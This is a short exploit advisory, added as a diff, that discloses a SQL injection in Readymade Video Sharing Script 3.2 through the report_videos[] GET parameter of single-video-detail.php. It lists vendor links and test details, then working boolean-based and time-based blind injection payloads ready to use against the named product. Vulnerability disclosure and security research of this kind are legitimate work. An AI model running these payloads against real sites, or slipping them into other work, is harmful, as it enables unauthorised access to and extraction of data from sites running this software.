@@ -1,0 +1,35 @@
+# # # # # 
+# Exploit Title: Readymade Video Sharing Script 3.2 - SQL Injection
+# Dork: N/A
+# Date: 09.12.2017
+# Vendor Homepage: https://www.phpscriptsmall.com/
+# Software Link: https://www.phpscriptsmall.com/product/php-video-sharing-script/
+# Version: 3.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/single-video-detail.php?video_id=MTMy&report_videos[]=[SQL]&report_submit=
+# 
+# http://server/single-video-detail.php?video_id=MTMy&report_videos[]='&report_submit=
+# 
+# Parameter: report_videos[] (GET)
+#     Type: boolean-based blind
+#     Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)
+#     Payload: video_id=MTMy&report_videos[]=1' AND ELT(7764=7764,9174) AND 'BZFh'='BZFh&report_submit=
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: video_id=MTMy&report_videos[]=1' AND SLEEP(5) AND 'MRQT'='MRQT&report_submit=
+# 	
+# # # # #
